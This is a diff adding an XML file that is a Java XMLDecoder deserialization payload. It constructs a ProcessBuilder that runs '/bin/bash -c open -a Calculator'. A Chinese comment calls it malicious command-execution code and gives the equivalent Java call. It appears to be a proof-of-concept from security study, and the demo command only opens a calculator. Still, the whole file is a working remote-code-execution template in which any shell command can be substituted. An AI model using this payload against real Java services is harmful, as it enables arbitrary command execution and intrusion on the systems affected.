@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.8.0_361" class="java.beans.XMLDecoder">
+    <object class="java.lang.ProcessBuilder">
+        <array class="java.lang.String" length="3">
+            <void index="0">
+                <string>/bin/bash</string>
+            </void>
+            <void index="1">
+                <string>-c</string>
+            </void>
+            <void index="2">
+                <string>open -a Calculator</string>
+            </void>
+        </array>
+        <void method="start"></void>
+    </object>
+</java>
+
+<!-- 首先准备一个命令执行的恶意代码：
+new java.lang.ProcessBuilder("/bin/bash", "-c", "open -a Calculator").start();
+ -->
